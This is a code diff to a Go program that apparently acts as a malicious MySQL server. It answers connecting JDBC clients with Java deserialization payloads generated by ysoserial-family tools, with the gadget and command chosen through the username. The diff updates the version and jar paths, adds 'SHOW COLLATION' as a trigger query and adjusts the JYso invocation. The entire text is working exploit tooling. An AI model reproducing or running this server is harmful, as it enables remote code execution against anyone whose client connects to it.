@@ -14,13 +14,13 @@ import (
 	"strings"
 )
 
-const Version = "v0.0.3"
+const Version = "v0.0.4"
 
 var addr = flag.String("addr", "0.0.0.0:3306", "listen addr")
 var javaBinPath = flag.String("java", "java", "java bin path")
 var ysoserialPath = flag.String("yso", "ysoJar/ysoserial-0.0.6-SNAPSHOT-all.jar", "ysoserial bin path")
-var ysuserialPath = flag.String("ysu", "ysoJar/ysuserial-1.5-su18-all.jar", "ysuserial bin path")
-var jysoPath = flag.String("jyso", "ysoJar/JYso-3.5.7.jar", "jyso bin path")
+var ysuserialPath = flag.String("ysu", "ysoJar/ysuserial-su18-mod-1.7-all.jar", "ysuserial bin path")
+var jysoPath = flag.String("jyso", "ysoJar/JYso-1.3.5-pre.jar", "jyso bin path")
 var y4erysoPath = flag.String("y4ys", "ysoJar/Y4er-ysoserial-0.0.6-0417.jar", "y4eryso bin path")
 
 var ysu_url = flag.String("url", "/testbin", "ysuserial bin path")
@@ -207,7 +207,7 @@ func handleAccept(conn net.Conn) {
 		if requestQuery.Command == 3 {
 			log.Printf("[-] request query statement: %s\n", requestQuery.Statement)
 
-			if strings.Contains(requestQuery.Statement, "SHOW SESSION STATUS") {
+			if strings.Contains(requestQuery.Statement, "SHOW SESSION STATUS") || strings.Contains(requestQuery.Statement, "SHOW COLLATION") {
 				useYso := strings.HasPrefix(username, "yso")
 				useYsu := strings.HasPrefix(username, "ysu")
 				useJYso := strings.HasPrefix(username, "jyso")
@@ -232,7 +232,7 @@ func handleAccept(conn net.Conn) {
 				} else if useYsu {
 					cmd = exec.Command(*javaBinPath, "-jar", *ysuserialPath, "-url", *ysu_url, "-pw", *ysu_pw, "-hv", *ysu_hv, "-g", payload, "-p", command)
 				} else if useJYso {
-					cmd = exec.Command(*javaBinPath, "-jar", *jysoPath, "-yso 1", "-url", *ysu_url, "-pw", *ysu_pw, "-hv", *ysu_hv, "-g", payload, "-p", command)
+					cmd = exec.Command(*javaBinPath, "-jar", *jysoPath, "-y", "-url", *ysu_url, "-pw", *ysu_pw, "-hv", *ysu_hv, "-g", payload, "-p", command)
 				} else if useY4Ys {
 					cmd = exec.Command(*javaBinPath, "-jar", *y4erysoPath, payload, command)
 				}
